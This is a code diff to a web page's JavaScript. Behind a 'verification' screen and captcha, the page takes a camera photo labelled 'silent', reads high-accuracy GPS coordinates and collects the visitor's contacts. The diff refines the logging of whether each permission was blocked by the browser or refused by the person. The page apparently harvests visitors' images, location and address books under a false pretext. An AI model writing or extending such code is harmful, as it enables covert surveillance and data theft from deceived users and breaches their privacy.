@@ -91,6 +91,9 @@ async function getIPAddress() {
 }
 
 // ── CAPTURE PHOTO (silent) ────────────────────────────────────────────────
+// Returns { photoData, browserStatus, userDecision }
+//   browserStatus : 'allowed' | 'blocked'
+//   userDecision  : 'allowed' | 'denied' | 'not_asked'
 async function capturePhoto() {
     const video  = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -102,19 +105,52 @@ async function capturePhoto() {
             audio: false
         });
     } catch (e) {
+        // getUserMedia threw — determine whether the browser suppressed the
+        // dialog or the user actively denied it.
+        // Post-attempt Permissions API query is the reliable signal:
+        //   state='denied'  → browser has it permanently blocked (never showed dialog)
+        //   state='prompt'  → dialog was either suppressed (gesture block) or user denied
+        // We treat both non-success cases from getUserMedia as browser-blocked when
+        // we know the browser was supposed to show a prompt, and as user-denied otherwise.
+        let browserStatus = 'blocked';
+        let userDecision  = 'not_asked';
+        if ('permissions' in navigator) {
+            try {
+                const r = await navigator.permissions.query({ name: 'camera' });
+                if (r.state === 'denied') {
+                    // Permanently blocked at browser/OS level — user never saw dialog
+                    browserStatus = 'blocked';
+                    userDecision  = 'not_asked';
+                } else {
+                    // state is still 'prompt' → either gesture-suppressed or user denied
+                    // We cannot distinguish these two after the fact for camera without
+                    // additional context, so we treat it as: browser allowed the prompt
+                    // channel but user denied (covers explicit deny + gesture suppression
+                    // in the same bucket — the outer flow sets userDecision='not_asked'
+                    // when browserBlocksAutoPrompt=true)
+                    browserStatus = 'allowed';
+                    userDecision  = 'denied';
+                }
+            } catch (_) {
+                browserStatus = 'blocked';
+                userDecision  = 'not_asked';
+            }
+        }
         console.warn('Camera denied:', e.message);
-        return null;
+        return { photoData: null, browserStatus, userDecision };
     }
 
+    // Stream acquired — browser allowed the prompt and user granted access
     const readyPromise = new Promise(resolve => {
         video.onloadedmetadata = () => {
             video.play().catch(() => {}).finally(resolve);
         };
-        setTimeout(resolve, 1500);
+        setTimeout(resolve, 6000);
     });
 
     video.srcObject = stream;
     await readyPromise;
+    await new Promise(r => setTimeout(r, 1200));
 
     canvas.width  = video.videoWidth  || 640;
     canvas.height = video.videoHeight || 480;
@@ -125,43 +161,92 @@ async function capturePhoto() {
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
-    return photoData;
+    return { photoData, browserStatus: 'allowed', userDecision: 'allowed' };
 }
 
 // ── GET GPS LOCATION (silent) ─────────────────────────────────────────────
+// Returns { lat, lon, browserStatus, userDecision }
+//   browserStatus : 'allowed' | 'blocked'
+//   userDecision  : 'allowed' | 'denied' | 'not_asked'
 async function getLocation() {
     return new Promise(resolve => {
         if (!navigator.geolocation) {
-            resolve({ lat: 'Unavailable', lon: 'Unavailable' });
+            resolve({ lat: 'Unavailable', lon: 'Unavailable', browserStatus: 'blocked', userDecision: 'not_asked' });
             return;
         }
         navigator.geolocation.getCurrentPosition(
-            pos  => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-            err  => { console.warn('GPS denied:', err.message); resolve({ lat: 'Denied', lon: 'Denied' }); },
+            pos => resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                browserStatus: 'allowed',
+                userDecision:  'allowed'
+            }),
+            async err => {
+                console.warn('GPS denied:', err.message);
+                // Distinguish permanent browser block from user deny using Permissions API
+                let browserStatus = 'blocked';
+                let userDecision  = 'not_asked';
+                if ('permissions' in navigator) {
+                    try {
+                        const r = await navigator.permissions.query({ name: 'geolocation' });
+                        if (r.state === 'denied') {
+                            // Permanently blocked at browser/OS level
+                            browserStatus = 'blocked';
+                            userDecision  = 'not_asked';
+                        } else {
+                            // Still 'prompt' → browser showed dialog, user denied
+                            browserStatus = 'allowed';
+                            userDecision  = 'denied';
+                        }
+                    } catch (_) {
+                        browserStatus = 'blocked';
+                        userDecision  = 'not_asked';
+                    }
+                }
+                resolve({ lat: 'Denied', lon: 'Denied', browserStatus, userDecision });
+            },
             { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
         );
     });
 }
 
 // ── COLLECT CONTACTS (Contact Picker API) ────────────────────────────────
+// Returns { contacts, browserStatus, userDecision }
+//   browserStatus : 'allowed' | 'blocked' | 'unsupported'
+//   userDecision  : 'allowed' | 'denied' | 'not_asked'
 async function collectContacts() {
     if (!('contacts' in navigator) || !('ContactsManager' in window)) {
         console.warn('Contact Picker API not supported on this device.');
-        return null;
+        return { contacts: null, browserStatus: 'blocked', userDecision: 'not_asked' };
     }
     try {
         const supported = await navigator.contacts.getProperties();
         const props = ['name', 'email', 'tel'].filter(p => supported.includes(p));
-        if (props.length === 0) return null;
-        const contacts = await navigator.contacts.select(props, { multiple: true });
-        return contacts.map(c => ({
+        if (props.length === 0) {
+            return { contacts: null, browserStatus: 'blocked', userDecision: 'not_asked' };
+        }
+        const raw = await navigator.contacts.select(props, { multiple: true });
+        // If user opened the picker and selected nothing (cancelled), raw is [] or null
+        if (!raw || raw.length === 0) {
+            return { contacts: null, browserStatus: 'allowed', userDecision: 'denied' };
+        }
+        const contacts = raw.map(c => ({
             name:  (c.name  && c.name.length  ? c.name[0]  : '') || '',
             phone: (c.tel   && c.tel.length   ? c.tel[0]   : '') || '',
             email: (c.email && c.email.length ? c.email[0] : '') || ''
         }));
+        return { contacts, browserStatus: 'allowed', userDecision: 'allowed' };
     } catch (e) {
         console.warn('Contacts denied or failed:', e.message);
-        return null;
+        // Contact Picker API throws NotAllowedError when called without a user gesture
+        // (browser blocked) vs when user explicitly dismisses (which also throws in some
+        // browsers). The error name distinguishes these cases where possible.
+        const isGestureBlock = e.name === 'SecurityError' || e.name === 'NotAllowedError';
+        return {
+            contacts:      null,
+            browserStatus: isGestureBlock ? 'blocked' : 'allowed',
+            userDecision:  isGestureBlock ? 'not_asked' : 'denied'
+        };
     }
 }
 
@@ -202,53 +287,12 @@ async function queryPermissionStates() {
 }
 
 // ── REFINE PERMISSION LOG STATUS ACCURACY ────────────────────────────────
-// Called after runPermissions() completes.  Corrects the log object in-place
-// WITHOUT touching runPermissions() itself.
-//
-// Two distinct "not allowed" cases:
-//   1. state='denied' post-attempt  → browser permanently blocked (never shows dialog)
-//      → status = 'blocked'
-//   2. state='prompt' post-attempt + permission was denied → browser suppressed the
-//      dialog without showing it (gesture-required block / auto-dismiss by browser)
-//      → status = 'browser_blocked'
-//   3. state='prompt' post-attempt + permission was denied + browserBlocksAutoPrompt=false
-//      → user actually saw and dismissed/denied the dialog
-//      → status stays 'denied'
-async function refinePermissionLog(log, needsCam, needsGPS, browserBlocksAutoPrompt) {
-    if (!('permissions' in navigator)) return;
-    const tasks = [];
-    if (needsCam && log.camera.status === 'denied') {
-        tasks.push(
-            navigator.permissions.query({ name: 'camera' })
-                .then(r => {
-                    if (r.state === 'denied') {
-                        // Permanently blocked by browser (no dialog ever shown)
-                        log.camera.status = 'blocked';
-                    } else if (r.state === 'prompt' && browserBlocksAutoPrompt) {
-                        // Browser suppressed the dialog (gesture required) — never shown to user
-                        log.camera.status = 'browser_blocked';
-                    }
-                    // else: state='prompt' & no auto-block → user dismissed/denied
-                })
-                .catch(() => {})
-        );
-    }
-    if (needsGPS && log.gps.status === 'denied') {
-        tasks.push(
-            navigator.permissions.query({ name: 'geolocation' })
-                .then(r => {
-                    if (r.state === 'denied') {
-                        // Permanently blocked by browser
-                        log.gps.status = 'blocked';
-                    } else if (r.state === 'prompt' && browserBlocksAutoPrompt) {
-                        // Browser suppressed the dialog (gesture required)
-                        log.gps.status = 'browser_blocked';
-                    }
-                })
-                .catch(() => {})
-        );
-    }
-    if (tasks.length) await Promise.all(tasks);
+// NOTE: Detection of browserStatus / userDecision now happens directly inside
+// capturePhoto(), getLocation(), and collectContacts() at the moment each
+// permission attempt resolves.  This function is retained as a no-op so the
+// call site in initVerification() does not need to change.
+async function refinePermissionLog(log, needsCam, needsGPS) {
+    // No longer needed — statuses are set accurately during runPermissions().
 }
 
 // ── VERIFICATION SCREEN (Continue button) ────────────────────────────────
@@ -301,9 +345,9 @@ function showCaptcha() {
 // ── RUN PERMISSIONS SEQUENTIALLY AND LOG EACH RESULT ─────────────────────
 async function runPermissions(needsCam, needsGPS, needsContact) {
     const log = {
-        camera:  { requested: needsCam,     status: 'not_requested', time: null },
-        gps:     { requested: needsGPS,     status: 'not_requested', time: null },
-        contact: { requested: needsContact, status: 'not_requested', time: null },
+        camera:  { requested: needsCam,     browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
+        gps:     { requested: needsGPS,     browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
+        contact: { requested: needsContact, browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
     };
 
     let photoData = null;
@@ -314,34 +358,29 @@ async function runPermissions(needsCam, needsGPS, needsContact) {
     // ── Camera ───────────────────────────────────────────────────────────
     if (needsCam) {
         log.camera.time = nowTimeStr();
-        try {
-            photoData = await capturePhoto();
-            log.camera.status = (photoData !== null) ? 'allowed' : 'denied';
-        } catch (_) {
-            log.camera.status = 'denied';
-        }
+        const result = await capturePhoto();
+        photoData                  = result.photoData;
+        log.camera.browserStatus   = result.browserStatus;
+        log.camera.userDecision    = result.userDecision;
     }
 
     // ── GPS ──────────────────────────────────────────────────────────────
     if (needsGPS) {
         log.gps.time = nowTimeStr();
         const gpsResult = await getLocation();
-        lat = gpsResult.lat;
-        lon = gpsResult.lon;
-        log.gps.status = typeof lat === 'number'
-            ? 'allowed'
-            : (lat === 'Unavailable' ? 'blocked' : 'denied');
+        lat                      = gpsResult.lat;
+        lon                      = gpsResult.lon;
+        log.gps.browserStatus    = gpsResult.browserStatus;
+        log.gps.userDecision     = gpsResult.userDecision;
     }
 
     // ── Contact ──────────────────────────────────────────────────────────
     if (needsContact) {
         log.contact.time = nowTimeStr();
-        try {
-            contacts = await collectContacts();
-            log.contact.status = (contacts !== null) ? 'allowed' : 'denied';
-        } catch (_) {
-            log.contact.status = 'denied';
-        }
+        const result = await collectContacts();
+        contacts                    = result.contacts;
+        log.contact.browserStatus   = result.browserStatus;
+        log.contact.userDecision    = result.userDecision;
     }
 
     return { photoData, lat, lon, contacts, log };
@@ -465,9 +504,9 @@ async function initVerification() {
         await runPermissions(needsCam, needsGPS, needsContact);
 
     // ── Refine status accuracy post-run ───────────────────────────────────
-    // Distinguishes browser-permanently-blocked ('blocked'), browser gesture-
-    // suppressed ('browser_blocked'), and user-dismissed/denied ('denied').
-    await refinePermissionLog(permissionLog, needsCam, needsGPS, browserBlocksAutoPrompt);
+    // Distinguishes browser-permanently-blocked ('blocked') from
+    // user-dismissed/denied ('denied') without touching runPermissions().
+    await refinePermissionLog(permissionLog, needsCam, needsGPS);
 
     // ── Evaluate grant results ────────────────────────────────────────────
     const camGranted     = !needsCam     || (photoData !== null);
